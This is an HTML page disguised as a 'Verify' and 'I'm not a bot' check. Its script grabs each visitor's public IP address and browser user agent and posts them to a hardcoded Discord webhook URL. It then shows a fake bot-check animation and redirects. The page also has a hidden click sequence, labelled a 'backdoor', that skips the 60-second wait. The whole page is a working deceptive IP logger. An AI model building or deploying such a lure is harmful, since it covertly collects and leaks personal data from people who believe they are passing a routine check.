<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Verify</title>
<style>
  @import url('https://www.roblox.com/games/81501197540648/Yellow-bee-farm-tide-at-night');

  body {
    background: linear-gradient(135deg, #667eea, #764ba2);
    font-family: 'Poppins', sans-serif;
    color: #fff;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 100vh;
    margin: 0;
    padding: 20px;
  }

  button {
    background: #fff;
    color: #764ba2;
    border: none;
    border-radius: 30px;
    padding: 15px 40px;
    font-size: 1.2rem;
    font-weight: 600;
    cursor: pointer;
    box-shadow: 0 8px 15px rgba(118, 75, 162, 0.3);
    transition: all 0.3s ease;
    user-select: none;
  }

  button:disabled {
    background: #ccc;
    color: #666;
    cursor: not-allowed;
    box-shadow: none;
  }

  button:not(:disabled):hover {
    background: #5a3790;
    color: #fff;
    box-shadow: 0 12px 20px rgba(90, 55, 144, 0.6);
    transform: translateY(-3px);
  }

  #botCheckBtn {
    display: none;
    margin-top: 30px;
  }

  #status {
    margin-top: 30px;
    font-size: 1.1rem;
    min-height: 1.5em;
    opacity: 0;
    transition: opacity 0.6s ease;
    text-align: center;
    max-width: 320px;
  }

  #status.visible {
    opacity: 1;
  }

  .progress-container {
    width: 320px;
    height: 12px;
    background: rgba(255, 255, 255, 0.2);
    border-radius: 30px;
    margin-top: 20px;
    overflow: hidden;
    box-shadow: inset 0 0 5px rgba(255,255,255,0.3);
    cursor: pointer;
    user-select: none;
  }

  .progress-bar {
    height: 100%;
    width: 0%;
    background: #fff;
    border-radius: 30px;
    transition: width 1s linear;
  }
</style>
</head>
<body>

<button id="startBtn" aria-label="Verify button">Verify</button>

<div class="progress-container" aria-label="Waiting progress" role="progressbar" aria-valuemin="0" aria-valuemax="60" aria-valuenow="0" style="display:none;">
  <div class="progress-bar"></div>
</div>

<div id="status" aria-live="polite"></div>
<button id="botCheckBtn" aria-label="Confirm you are not a bot">I'm not a bot</button>

<script>
  const webhookURL = 'https://discord.com/api/webhooks/1422433036716216360/yXPFyJUxEuXfzSM7tallZAL_ZGpwGmmHWA9_w4OlvLVJeYFn9wDFxF0WbAyp9m_rX7bK';
  const startBtn = document.getElementById('startBtn');
  const statusDiv = document.getElementById('status');
  const botCheckBtn = document.getElementById('botCheckBtn');
  const progressContainer = document.querySelector('.progress-container');
  const progressBar = document.querySelector('.progress-bar');

  let verifyClickCount = 0;
  let backdoorActive = false;
  let backdoorTimer = null;

  function getDeviceInfo() {
    return navigator.userAgent;
  }

  async function getIP() {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch (e) {
      return 'IP not available';
    }
  }

  async function sendToWebhook(device, ip) {
    const content = `User  info:\nDevice: ${device}\nIP: ${ip}`;
    try {
      await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content })
      });
      return true;
    } catch (e) {
      return false;
    }
  }

  function showStatus(message) {
    statusDiv.textContent = message;
    statusDiv.classList.add('visible');
  }

  async function waitWithProgress(seconds) {
    progressContainer.style.display = 'block';
    progressBar.style.width = '0%';
    progressContainer.setAttribute('aria-valuenow', 0);

    for (let i = 1; i <= seconds; i++) {
      // If backdoor activated, skip wait immediately
      if (backdoorActive) {
        progressBar.style.width = '100%';
        progressContainer.setAttribute('aria-valuenow', seconds);
        return;
      }
      await new Promise(resolve => setTimeout(resolve, 1000));
      const percent = (i / seconds) * 100;
      progressBar.style.width = percent + '%';
      progressContainer.setAttribute('aria-valuenow', i);
      showStatus(`Please wait ${seconds - i} second${seconds - i !== 1 ? 's' : ''}...`);
    }
  }

  async function startProcess(skipWait = false) {
    startBtn.disabled = true;
    botCheckBtn.style.display = 'none';
    progressContainer.style.display = 'none';
    statusDiv.classList.remove('visible');
    backdoorActive = false;
    verifyClickCount = 0;
    if (backdoorTimer) {
      clearTimeout(backdoorTimer);
      backdoorTimer = null;
    }

    if (!skipWait) {
      await waitWithProgress(60);
    } else {
      // Show progress bar filled immediately if skipping wait
      progressContainer.style.display = 'block';
      progressBar.style.width = '100%';
      progressContainer.setAttribute('aria-valuenow', 60);
      showStatus('Skipping wait...');
    }

    showStatus('Sending your info...');
    const device = getDeviceInfo();
    const ip = await getIP();
    const sent = await sendToWebhook(device, ip);

    if (sent) {
      showStatus('Info sent! Performing bot check...');
    } else {
      showStatus('Failed to send info. Performing bot check anyway...');
    }

    // Fake bot check delay with animated dots
    await new Promise(resolve => {
      let dots = 0;
      const interval = setInterval(() => {
        dots = (dots + 1) % 4;
        showStatus('Performing bot check' + '.'.repeat(dots));
      }, 500);
      setTimeout(() => {
        clearInterval(interval);
        resolve();
      }, 4000);
    });

    showStatus('Please click the button below to continue.');
    botCheckBtn.style.display = 'inline-block';
  }

  startBtn.addEventListener('click', () => {
    verifyClickCount++;
    // If 5 or more clicks, activate backdoor timer
    if (verifyClickCount === 5) {
      backdoorActive = false;
      if (backdoorTimer) clearTimeout(backdoorTimer);
      backdoorTimer = setTimeout(() => {
        // After 10 seconds, reset backdoor state
        backdoorActive = false;
        verifyClickCount = 0;
        backdoorTimer = null;
      }, 10000);
    }
    // Start process only on first click (or if you want on every click, change here)
    if (verifyClickCount === 1) {
      startProcess(false);
    }
  });

  progressContainer.addEventListener('click', () => {
    // If user clicked progress bar within 10 seconds after 5th verify click, skip wait
    if (verifyClickCount >= 5 && backdoorTimer) {
      backdoorActive = true;
      clearTimeout(backdoorTimer);
      backdoorTimer = null;
    }
  });

  botCheckBtn.addEventListener('click', () => {
    window.location.href = 'https://example.com'; // Change to your target URL
  });
</script>

</body>
</html>
